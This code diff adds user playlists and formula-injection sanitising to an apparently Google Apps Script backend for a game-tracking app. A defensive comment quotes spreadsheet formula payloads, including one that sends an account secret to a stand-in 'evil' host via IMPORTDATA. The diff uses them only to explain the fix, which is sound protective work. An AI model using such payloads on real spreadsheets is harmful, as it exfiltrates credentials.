@@ -10,6 +10,27 @@ const LIVE_SHEET      = '_live';       // reserved tab name for live game state
 // Control-plane tabs the admin sheet editor may read/write (all in CONTROL_SHEET_ID).
 const ADMIN_SHEETS    = [GROUPS_SHEET, METADATA_SHEET, LIVE_SHEET];
 
+// User content, not control plane. Deliberately absent from ADMIN_SHEETS: the
+// admin sheet editor exists to repair the control tabs by hand, and putting
+// every account's playlists in one editable grid buys nothing.
+const PLAYLISTS_SHEET  = '_playlists';
+const PLAYLIST_HEADERS = ['Id', 'Owner', 'Name', 'Note', 'Refs', 'Updated At'];
+const PLAYLIST_MAX_REFS = 500;
+// Truncated rather than rejected: a name/note that's too long is a paste
+// accident, not an attack, and a hard failure there would just make someone
+// retype the same paste and hit the wall again.
+const PLAYLIST_MAX_FIELD_LEN = 200;
+// A real ref (game#time#type#name) is well under 100 chars. This leaves
+// generous headroom for long game and event names while still refusing a
+// single pathological ref large enough to blow out the joined refs cell —
+// the risk readPlaylists() can't see coming since it reads the tab raw.
+const PLAYLIST_MAX_REF_LEN = 300;
+// Generous on purpose — far more playlists than anyone would build by hand —
+// but readPlaylists() loads the WHOLE _playlists tab on every action=playlists
+// call, from every account, so one owner's unbounded row count becomes
+// everyone's slow request. A cap here is the only thing enforcing that.
+const PLAYLIST_MAX_PER_OWNER = 200;
+
 // Expected column order (must match what the Python pipeline reads)
 // Strike Move is appended LAST so the Python pipeline's positional reads of
 // columns 0-6 are unaffected. Every read path maps by header name, so tabs
@@ -65,6 +86,123 @@ function clearGroupsCache() {
 function isAdminSecret(secret) {
   const a = authFor(secret);
   return !!(a && a.role === 'admin');
+}
+
+// ── Playlist helpers ───────────────────────────────────────────
+// The _playlists tab, created on first use so a fresh control spreadsheet needs
+// no manual setup.
+function playlistsSheet() {
+  const ss = SpreadsheetApp.openById(CONTROL_SHEET_ID);
+  let sh = ss.getSheetByName(PLAYLISTS_SHEET);
+  if (!sh) {
+    sh = ss.insertSheet(PLAYLISTS_SHEET);
+    sh.appendRow(PLAYLIST_HEADERS);
+  }
+  return sh;
+}
+
+// Every playlist row. `row` is the 1-based sheet row, so a write can address it
+// directly rather than searching again. Never cached: the tab is small, it
+// changes on every edit, and the action=version fast-path must not let a client
+// skip a playlist change.
+function readPlaylists() {
+  const values = playlistsSheet().getDataRange().getDisplayValues();
+  if (values.length < 2) return [];
+  const h  = values[0].map(s => String(s).toLowerCase().trim());
+  const ii = h.indexOf('id'), oi = h.indexOf('owner'), ni = h.indexOf('name');
+  const ti = h.indexOf('note'), ri = h.indexOf('refs'), ui = h.indexOf('updated at');
+  if (ii < 0 || oi < 0) return [];
+  const out = [];
+  for (let i = 1; i < values.length; i++) {
+    const id = String(values[i][ii] || '').trim();
+    if (!id) continue;
+    out.push({
+      row:     i + 1,
+      id:      id,
+      owner:   String(values[i][oi] || '').trim(),
+      name:    ni >= 0 ? String(values[i][ni] || '') : '',
+      note:    ti >= 0 ? String(values[i][ti] || '') : '',
+      refs:    ri >= 0 ? String(values[i][ri] || '').split('\n').map(s => s.trim()).filter(Boolean) : [],
+      updated: ui >= 0 ? String(values[i][ui] || '') : '',
+    });
+  }
+  return out;
+}
+
+// Sheets evaluates a leading '=', '+' or '-' as a formula and a leading '@' as
+// a range name — and readPlaylists() reads the tab back with
+// getDisplayValues(), which is the EVALUATED text, which action=playlists then
+// hands straight to the caller. Without this, any caller with a valid secret
+// (viewer included — the save path has no role gate, by design) could save a
+// playlist named `=TEXTJOIN(",",1,_groups!A:C)` and read back every group,
+// secret and role in the app, because _playlists lives in the same spreadsheet
+// as _groups. `=IMPORTDATA("https://evil/?x="&_groups!B2)` would exfiltrate it
+// without even reading the row back.
+//
+// A leading apostrophe is the Sheets convention for "this cell is text": the
+// apostrophe is a format marker, not part of the value, so getDisplayValues()
+// omits it again and a playlist honestly named "-5m clips" round-trips
+// unchanged rather than coming back corrupted.
+function sheetSafe(s) {
+  const v = String(s == null ? '' : s);
+  const t = v.trim();
+  if (/^[=+\-@]/.test(t)) return "'" + v;
+  // A leading apostrophe IS Sheets' "treat this as text" marker, so it gets
+  // consumed on write just like the formula characters above — a playlist
+  // named "'19 season" would otherwise read back as "19 season". Escaping it
+  // with a second apostrophe round-trips losslessly: the marker is consumed,
+  // the escaped one stays as the value's real leading character.
+  if (t.charAt(0) === "'") return "'" + v;
+  return v;
+}
+
+// The only ref shape the client ever sends is TR.evId's: game#time#type#name,
+// with a numeric time. Anything else is not a legitimate request, so it is
+// refused rather than stored — refs are the one field a caller can fill with
+// arbitrary text and have read back verbatim, and a formula hidden in one of
+// them is the same leak as a formula in the name.
+function validPlaylistRef(r) {
+  const s = String(r);
+  if (s.length > PLAYLIST_MAX_REF_LEN) return false;
+  const p = s.split('#');
+  return p.length >= 4 && p[0] !== '' && /^\d+(?:\.\d+)?$/.test(p[1]);
+}
+
+// The playlist row this secret owns, or null. Ownership is checked here on
+// every write and never trusted from the client, the same way canEditGame
+// guards a game tab.
+function ownedPlaylist(secret, id) {
+  if (!secret || !id) return null;
+  const want = String(id);
+  return readPlaylists().find(p => p.id === want && p.owner === String(secret)) || null;
+}
+
+// Serialises the two playlist paths that look up a row index (ownedPlaylist)
+// and then act on that same index in a later, separate call: update-by-id and
+// delete. _playlists is one sheet shared by every account, so between the
+// lookup and the write a concurrent request for a DIFFERENT account could
+// delete a row above the one this request found, shifting every row below it
+// up by one — the index read here would then belong to someone else's
+// playlist by the time it's used. Every other handler in this file (game
+// rows, admin sheet edits) overwrites what it addressed by name or time and
+// is safe to repeat, so it never needs this; deleteRow is the one operation
+// on this sheet that renumbers rows out from under a concurrent reader, so it
+// and its paired read are the only things that need to run under a lock.
+// fn must do its lookup-then-write entirely inside the callback so both
+// happen under the same lock; its return value (a json(...) response) is
+// passed straight through.
+function withPlaylistLock(fn) {
+  const lock = LockService.getScriptLock();
+  try {
+    lock.waitLock(10000);
+  } catch (e) {
+    return json({ ok: false, error: 'Playlist is busy, try again.' });
+  }
+  try {
+    return fn();
+  } finally {
+    lock.releaseLock();
+  }
 }
 
 // ── Metadata helper ────────────────────────────────────────────
@@ -309,6 +447,16 @@ function doGet(e) {
       return json({ ok: true, role: auth.role, group: auth.group });
     }
 
+    // action=playlists → the caller's own saved playlists. Never cached, and
+    // deliberately above the cacheKeySuffix line below: a playlist changes no
+    // game data, so it must not ride on the version-keyed game cache.
+    if (e.parameter.action === 'playlists') {
+      const mine = readPlaylists()
+        .filter(p => p.owner === String(e.parameter.secret))
+        .map(p => ({ id: p.id, name: p.name, note: p.note, refs: p.refs, updated: p.updated }));
+      return json({ ok: true, playlists: mine });
+    }
+
     // action=admin_sheet → raw grid (headers + data rows) of a control sheet,
     // for the admin sheet editor. Admin only; never cached (always live).
     if (e.parameter.action === 'admin_sheet') {
@@ -430,6 +578,84 @@ function doPost(e) {
     // row (lazily creating the row + Groups column as needed). Admins skip this
     // — they should set Groups explicitly via backfill.
     const callerGroup = auth.role === 'admin' ? '' : (auth.group || '');
+
+    // action=save_playlist → create, or replace one the caller owns. Any role
+    // may own playlists, viewer included: a viewer is exactly the person
+    // building a teaching set, and a playlist grants no access to anything — a
+    // ref only resolves against events the caller could already see.
+    //
+    // No bumpVersion(): a playlist changes no game data, and bumping would make
+    // every client refetch the heavy action=all payload for nothing.
+    if (data.action === 'save_playlist') {
+      // Truncated, not rejected — see PLAYLIST_MAX_FIELD_LEN. The empty check
+      // runs on the trimmed name before the cap so an all-whitespace name
+      // still gets the normal "needs a name" message rather than a silent
+      // truncation to nothing.
+      const name = String(data.name == null ? '' : data.name).trim().slice(0, PLAYLIST_MAX_FIELD_LEN);
+      if (!name) return json({ ok: false, error: 'A playlist needs a name.' });
+      // A non-array refs (e.g. a bare string) is treated as no refs rather than
+      // fed to .map, which would throw and surface as a raw exception instead
+      // of a normal error response. Newlines are stripped per-ref (not just
+      // trimmed) because refs are joined with '\n' into one cell on write and
+      // split on '\n' on read — an embedded newline would otherwise silently
+      // become two entries the next time this playlist is read.
+      const refs = (Array.isArray(data.refs) ? data.refs : [])
+        .map(r => String(r).replace(/[\r\n]+/g, '').trim())
+        .filter(Boolean);
+      if (refs.length > PLAYLIST_MAX_REFS) {
+        return json({ ok: false, error: 'A playlist holds at most ' + PLAYLIST_MAX_REFS + ' events.' });
+      }
+      if (!refs.every(validPlaylistRef)) {
+        return json({ ok: false, error: 'A playlist event reference is malformed.' });
+      }
+      const note    = String(data.note == null ? '' : data.note).trim().slice(0, PLAYLIST_MAX_FIELD_LEN);
+      const updated = new Date().toISOString();
+      // Sanitised at the point of writing, not at the point of reading, so a
+      // row can never hold a live formula in the first place. The refs are
+      // joined into ONE cell, so it is the joined string that decides whether
+      // the cell is a formula — sanitising each ref separately would leave the
+      // first one deciding for all of them.
+      const cells = { name: sheetSafe(name), note: sheetSafe(note), refs: sheetSafe(refs.join('\n')) };
+      if (data.id) {
+        // Locked: the row index comes from ownedPlaylist and is used by
+        // setValues a few lines later, so both must run under the same lock
+        // withPlaylistLock takes — see its comment.
+        return withPlaylistLock(() => {
+          const sh    = playlistsSheet();
+          const owned = ownedPlaylist(data.secret, data.id);
+          // A miss is reported rather than silently creating a second row — the
+          // client asked to replace something specific.
+          if (!owned) return json({ ok: false, error: 'Playlist not found.' });
+          sh.getRange(owned.row, 1, 1, PLAYLIST_HEADERS.length)
+            .setValues([[owned.id, owned.owner, cells.name, cells.note, cells.refs, updated]]);
+          return json({ ok: true, id: owned.id });
+        });
+      }
+      // A brand-new row has no prior index to race on, so it appends unlocked.
+      // The count check races the same way — a generous soft cap, not a hard
+      // boundary — which is fine: it exists to stop one account from growing
+      // the shared tab without limit, not to be exact under concurrent taps.
+      const owner = String(data.secret);
+      const ownedCount = readPlaylists().filter(p => p.owner === owner).length;
+      if (ownedCount >= PLAYLIST_MAX_PER_OWNER) {
+        return json({ ok: false, error: 'An account holds at most ' + PLAYLIST_MAX_PER_OWNER + ' playlists.' });
+      }
+      const id = Utilities.getUuid();
+      playlistsSheet().appendRow([id, owner, cells.name, cells.note, cells.refs, updated]);
+      return json({ ok: true, id: id });
+    }
+
+    // action=delete_playlist → remove one the caller owns. Locked for the same
+    // reason as the save_playlist id branch: the row index is read here and
+    // deleteRow acts on it a moment later.
+    if (data.action === 'delete_playlist') {
+      return withPlaylistLock(() => {
+        const owned = ownedPlaylist(data.secret, data.id);
+        if (!owned) return json({ ok: false, error: 'Playlist not found.' });
+        playlistsSheet().deleteRow(owned.row);
+        return json({ ok: true });
+      });
+    }
 
     // action=update_rows → update Name/Comment for specific rows (admin only)
     if (data.action === 'update_rows') {
@@ -810,14 +1036,30 @@ function writeLiveRow(sheetName, team1, team2, score1, score2, timeSeconds, poss
     sheet.getRange(1, existing + 1, 1, LIVE_HEADERS.length - existing).setValues([LIVE_HEADERS.slice(existing)]);
   }
 
+  // action=live is a PUBLIC endpoint (no secret) that reads this sheet back
+  // with getDisplayValues() — every field a caller supplies here is a formula
+  // injection vector into a spreadsheet that also holds _groups (every
+  // account's secret and role), so each one goes through sheetSafe(), same as
+  // the playlist fields. Plain team names/scores/times/URLs never start with
+  // =+-@/', so sheetSafe() is a no-op for them and they round-trip unchanged.
   const nowStr = new Date().toISOString();
-  const newRow = [sheetName, team1 || '', team2 || '', score1 || 0, score2 || 0, timeSeconds || 0, nowStr, poss1 || 0, poss2 || 0, comps1 || 0, comps2 || 0, '', triesJson || '[]', youtubelink || ''];
+  const safeSheetName = sheetSafe(sheetName);
+  const newRow = [safeSheetName, sheetSafe(team1 || ''), sheetSafe(team2 || ''), sheetSafe(score1 || 0), sheetSafe(score2 || 0), sheetSafe(timeSeconds || 0), nowStr, sheetSafe(poss1 || 0), sheetSafe(poss2 || 0), sheetSafe(comps1 || 0), sheetSafe(comps2 || 0), '', sheetSafe(triesJson || '[]'), sheetSafe(youtubelink || '')];
   const values = sheet.getDataRange().getValues();
 
   const ytIdx = LIVE_HEADERS.length - 1; // Youtube Link is the last column
 
+  // Match on the RAW name, not the sanitised one. sheetSafe works precisely
+  // because Sheets treats the leading apostrophe as a format marker and drops
+  // it from the stored value — so the cell reads back as the raw name, and a
+  // comparison against the prefixed string could never match. Getting this
+  // wrong turns every update for such a name into an appendRow, growing _live
+  // without bound. clearLiveRow already keys off the raw name; this keeps them
+  // agreeing.
+  const key = String(sheetName == null ? '' : sheetName);
+
   for (let i = 1; i < values.length; i++) {
-    if (String(values[i][0]) === sheetName) {
+    if (String(values[i][0]) === key) {
       // Don't clobber a previously-set link with an empty update.
       if (!youtubelink && values[i][ytIdx]) newRow[ytIdx] = values[i][ytIdx];
       sheet.getRange(i + 1, 1, 1, newRow.length).setValues([newRow]);
